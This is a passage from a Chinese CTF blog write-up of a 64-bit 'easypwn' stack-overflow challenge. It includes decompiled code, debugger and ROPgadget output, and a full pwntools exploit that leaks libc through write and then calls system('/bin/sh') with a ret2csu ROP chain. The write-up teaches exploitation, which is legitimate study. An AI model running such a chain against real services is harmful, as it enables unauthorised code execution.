<span class="number">0L</span>L);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to CTF\n"</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  sub_4006C6(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们查看<strong>sub_4006C6</strong>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4006C6</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现到一个显著的栈溢出漏洞，可以看见read函数读取了长度为<strong>0x400(1024)</strong>的字符，然而<strong>sub_4006C6</strong>函数里面的可以看到栈桢的大小是<strong>10h</strong></p>
<p>由于<strong>sub_4006C6</strong>函数的栈桢大小<strong>10h</strong>远小于<strong>read</strong>函数可以读取的数据长度<strong>400h</strong>，在进行循环赋值的时候，<strong>sub_4006C6</strong>函数保存在栈中的返回地址会被覆盖</p>
<p>我们进行动态调式验证一下我们的判断</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> b *0x00000000004006F6</span><br><span class="line">Breakpoint 1 at 0x4006f6</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /mnt/hgfs/share/easypwn/easypwn </span><br><span class="line">Welcome to CTF</span><br><span class="line">aaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004006f6 in ?? ()</span><br></pre></td></tr></table></figure>

<p>我们查看一下栈上的情况</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rsp      0x7fffffffda60 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">01:0008│          0x7fffffffda68 —▸ 0x7fffffffda90 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">02:0010│ rsi      0x7fffffffda70 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">... ↓</span><br><span class="line">04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1</span><br></pre></td></tr></table></figure>

<p>我们可以发现函数的返回地址就是如下图所示，且即将被覆盖，超过<strong>0x18</strong>字节即会覆盖返回地址</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 0xdff800007ffff7a1</span><br></pre></td></tr></table></figure>

<p>由于程序设置了栈不可执行，可以构造<strong>ROP</strong>链，泄露<strong>libc</strong>中的函数</p>
<p><strong>64</strong>位程序和我们之前一直做的<strong>32</strong>位程序在传参数方式上有很大的不同</p>
<p><strong>64</strong>位和<strong>32</strong>位的区别主要有两点：首先是内存地址的范围由<strong>32</strong>位变成了<strong>64</strong>位。但是可以使用的内存地址不能大于<code>0x00007FFFFFFFFFFF</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，<strong>x86</strong>中参数都是保存在栈上,但在x64中的前六个参数依次保存在<strong>RDI</strong>, <strong>RSI</strong>, <strong>RDX</strong>, <strong>RCX</strong>,<strong>R8</strong>和 <strong>R9</strong>中，如果还有更多的参数的话才会保存在栈上。</p>
<p>也就是说我们需要指令将传入栈中的数据弹出栈传入寄存器中才能完成参数传递。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<strong>gadget</strong>，</p>
<p>由于<strong>sub_4006C6</strong>拷贝时，会被<strong>\x00</strong>截断，所以不能连续覆盖多个地址来<strong>ROP</strong>，</p>
<p>在<strong>sub_4006C6</strong>函数<strong>ret</strong>处下断点，调试可以发现<strong>sub_4006C6</strong>返回地址下方即为<strong>read</strong>时的<strong>buf</strong>处</p>
<p>所以可以覆盖返回地址为<strong>pop pop pop pop ret</strong>指令地址，返回时弹出<strong>0x18</strong>个填充字节和返回地址,返回到<strong>buf+0x20</strong>处，就避开了栈不可执行</p>
<p>在<strong>buf+0x20</strong>处构造<strong>ROP</strong>，通过write函数，先泄露<strong>libc</strong>基地址，返回到<strong>start</strong></p>
<p>重新执行，输入使之执行<strong>system(‘/bin/sh’)</strong></p>
<p>需要用到的信息，包括<strong>bss</strong>段的地址、<strong>main</strong>函数地址、程序中已有函数的地址、<strong>gadgets</strong>地址</p>
<p>所以我们直接只用<strong>ROP gadgets</strong>工具寻找64位环境下可以使用的<strong>gadgets</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/Untitled Folder$ ROPgadget --binary easypwn</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400622 : adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x000000000040061e : adc dword ptr [rbp - 0x41], ebx ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004007ef : add bl, dh ; ret</span><br><span class="line">0x00000000004007ed : add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x00000000004007eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret</span><br><span class="line">0x000000000040076d : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000040062c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ec : add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x000000000040076e : add byte ptr [rax], al ; add cl, cl ; ret</span><br><span class="line">0x000000000040053b : add byte ptr [rax], al ; add rsp, 8 ; ret</span><br><span class="line">0x000000000040076f : add byte ptr [rax], al ; leave ; ret</span><br><span class="line">0x000000000040062e : add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ee : add byte ptr [rax], al ; ret</span><br><span class="line">0x0000000000400698 : add byte ptr [rcx], al ; ret</span><br><span class="line">0x0000000000400770 : add cl, cl ; ret</span><br><span class="line">0x0000000000400694 : add eax, 0x2009de ; add ebx, esi ; ret</span><br><span class="line">0x0000000000400699 : add ebx, esi ; ret</span><br><span class="line">0x000000000040053e : add esp, 8 ; ret</span><br><span class="line">0x000000000040053d : add rsp, 8 ; ret</span><br><span class="line">0x0000000000400697 : and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x00000000004007c9 : call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007ca : call qword ptr [rsp + rbx*8]</span><br><span class="line">0x00000000004006be : call rax</span><br><span class="line">0x00000000004006fa : dec ecx ; ret</span><br><span class="line">0x0000000000400695 : fimul word ptr [rcx] ; and byte ptr [rax], al ; add ebx, esi ; ret</span><br><span class="line">0x00000000004007cc : fmul qword ptr [rax - 0x7d] ; ret</span><br><span class="line">0x00000000004006b9 : int1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x000000000040061d : je 0x400638 ; pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x000000000040066b : je 0x400680 ; pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004006b8 : je 0x4006b1 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400625 : jmp rax</span><br><span class="line">0x00000000004006fb : leave ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040076c : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000004006bc : mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400620 : mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004006bb : mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400628 : nop dword ptr [rax + rax] ; pop rbp ; ret</span><br><span class="line">0x00000000004007e8 : nop dword ptr [rax + rax] ; ret</span><br><span class="line">0x0000000000400675 : nop dword ptr [rax] ; pop rbp ; ret</span><br><span class="line">0x0000000000400696 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret</span><br><span class="line">0x000000000040066c : or ebx, dword ptr [rbp - 0x41] ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e2 : pop r15 ; ret</span><br><span class="line">0x0000000000400621 : pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x0000000000400692 : pop rbp ; mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040061f : pop rbp ; mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br><span class="line">0x00000000004007e1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004006ba : push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line">0x0000000000400296 : retf</span><br><span class="line">0x000000000040066a : sal byte ptr [rbx + rcx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x000000000040061c : sal byte ptr [rcx + rdx + 0x5d], 0xbf ; pop rax ; adc byte ptr [rax], ah ; jmp rax</span><br><span class="line">0x00000000004006b7 : sal byte ptr [rcx + rsi*8 + 0x55], 0x48 ; mov ebp, esp ; call rax</span><br><span class="line">0x00000000004007f5 : sub esp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x00000000004007f4 : sub rsp, 8 ; add rsp, 8 ; ret</span><br><span class="line">0x000000000040062a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret</span><br><span class="line">0x00000000004007ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret</span><br><span class="line">0x00000000004006b6 : test eax, eax ; je 0x4006b3 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line">0x00000000004006b5 : test rax, rax ; je 0x4006b4 ; push rbp ; mov rbp, rsp ; call rax</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 69</span><br></pre></td></tr></table></figure>

<p>不过这样子有点太乱了，我们一般只需要使用<strong>pop</strong>、<strong>ret</strong>、<strong>mov</strong>类型的<strong>gadgets</strong>，所以我们再查一查</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/easypwn$ ROPgadget --binary easypwn --only "pop|ret"</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007dc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007de : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007e2 : pop r15 ; ret</span><br><span class="line">0x00000000004007db : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007df : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007e3 : pop rdi ; ret</span><br><span class="line">0x00000000004007e1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x0000000000400693 : mov byte ptr [rip + 0x2009de], 1 ; ret</span><br><span class="line">0x000000000040076c : mov eax, 0 ; leave ; ret</span><br><span class="line">0x00000000004006bc : mov ebp, esp ; call rax</span><br><span class="line">0x0000000000400620 : mov edi, 0x601058 ; jmp rax</span><br><span class="line">0x00000000004007c7 : mov edi, edi ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004007c6 : mov edi, r15d ; call qword ptr [r12 + rbx*8]</span><br><span class="line">0x00000000004006bb : mov rbp, rsp ; call rax</span><br></pre></td></tr></table></figure>

<p> 其实这题有坑，其实是存在我们常用的<strong>gadgets</strong>的，只是工具没有搜索出来，然后也没有标识<strong>__libc_csu_init()</strong>这个函数，就需要我们自己多去看看题目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400780</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400780</span>                 push    r15</span><br><span class="line">.text:<span class="number">0000000000400782</span>                 push    r14</span><br><span class="line">.text:<span class="number">0000000000400784</span>                 mov     r15d, edi</span><br><span class="line">.text:<span class="number">0000000000400787</span>                 push    r13</span><br><span class="line">.text:<span class="number">0000000000400789</span>                 push    r12</span><br><span class="line">.text:<span class="number">000000000040078B</span>                 lea     r12, off_600E10</span><br><span class="line">.text:<span class="number">0000000000400792</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400793</span>                 lea     rbp, off_600E18</span><br><span class="line">.text:<span class="number">000000000040079</span>A                 push    rbx</span><br><span class="line">.text:<span class="number">000000000040079B</span>                 mov     r14, rsi</span><br><span class="line">.text:<span class="number">000000000040079</span>E                 mov     r13, rdx</span><br><span class="line">.text:<span class="number">00000000004007</span>A1                 sub     rbp, r12</span><br><span class="line">.text:<span class="number">00000000004007</span>A4                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004007</span>A8                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">00000000004007</span>AC                 call    _init_proc</span><br><span class="line">.text:<span class="number">00000000004007B</span>1                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">00000000004007B</span>4                 jz      <span class="keyword">short</span> loc_4007D6</span><br><span class="line">.text:<span class="number">00000000004007B</span>6                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">00000000004007B</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">00000000004007</span>C0</span><br><span class="line">.text:<span class="number">00000000004007</span>C0 loc_4007C0:                             ; CODE XREF: init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">00000000004007</span>C0                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">00000000004007</span>C3                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">00000000004007</span>C6                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">00000000004007</span>C9                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">00000000004007</span>CD                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004007</span>D1                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">00000000004007</span>D4                 jnz     <span class="keyword">short</span> loc_4007C0</span><br><span class="line">.text:<span class="number">00000000004007</span>D6</span><br><span class="line">.text:<span class="number">00000000004007</span>D6 loc_4007D6:                             ; CODE XREF: init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">00000000004007</span>D6                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004007</span>DA                 pop     rbx</span><br><span class="line">.text:<span class="number">00000000004007</span>DB                 pop     rbp</span><br><span class="line">.text:<span class="number">00000000004007</span>DC                 pop     r12</span><br><span class="line">.text:<span class="number">00000000004007</span>DE                 pop     r13</span><br><span class="line">.text:<span class="number">00000000004007E0</span>                 pop     r14</span><br><span class="line">.text:<span class="number">00000000004007E2</span>                 pop     r15</span><br><span class="line">.text:<span class="number">00000000004007E4</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004007E4</span> ; &#125; <span class="comment">// starts at 400780</span></span><br></pre></td></tr></table></figure>

<p>然后就是套路模板EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">'./easypwn'</span>)</span><br><span class="line">elf=ELF(<span class="string">"./easypwn"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line">main_addr = <span class="number">0x4006FD</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4007E3</span><span class="comment"># pop rdi ret</span></span><br><span class="line">pop4_r12_ret = <span class="number">0x4007DC</span><span class="comment"># pop r12 r13 r14 r15</span></span><br><span class="line">pop6_rbx_ret = <span class="number">0x4007DA</span><span class="comment"># pop rbx rbp r12 r13 r14 r15</span></span><br><span class="line">mov_rdx_rsi_edi_call = <span class="number">0x4007C0</span></span><br><span class="line"><span class="comment">#mov rdx, r13 mov rsi, r14 mov di, r15d  call qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">"__main__"</span>:</span><br><span class="line">    io.recvuntil(<span class="string">"Welcome to CTF\n"</span>)</span><br><span class="line"></span><br><span class="line">    got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">    payload=<span class="number">0x18</span>*<span class="string">"a"</span> + p64(pop4_r12_ret)</span><br><span class="line"></span><br><span class="line">    payload+=p64(pop6_rbx_ret)+ p64(<span class="number">0x0</span>) + p64(<span class="number">0x1</span>) + p64(got_write)</span><br><span class="line">    payload+=p64(<span class="number">8</span>) + p64(got_write) + p64(<span class="number">1</span>)  + p64(mov_rdx_rsi_edi_call)</span><br><span class="line">    payload+=<span class="string">'a'</span>*<span class="number">56</span></span><br><span class="line">    payload+=p64(main_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">    io.recvuntil(<span class="number">0x18</span>*<span class="string">"a"</span>)</span><br><span class="line">    io.recv(<span class="number">3</span>)</span><br><span class="line">    write_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"write_addr:"</span>+hex(write_addr)</span><br><span class="line">    libc_base_addr=write_addr-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base_addr:"</span>+hex(libc_base_addr)</span><br><span class="line">    system_addr=libc_base_addr+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"system_addr:"</span>+hex(system_addr)</span><br><span class="line">    </span><br><span class="line">    bbs_addr = elf.bss()</span><br><span class="line">    </span><br><span class="line">    payload =  <span class="number">0x18</span>*<span class="string">"a"</span></span><br><span class="line">    payload += p64(pop4_r12_ret)</span><br><span class="line">    payload += p64(pop6_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">8</span>) + p64(bbs_addr) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(mov_rdx_rsi_edi_call)</span><br><span class="line">    payload += <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">    payload += p64(pop_rdi_ret)</span><br><span class="line">    payload += p64(bbs_addr)</span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Welcome to CTF\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
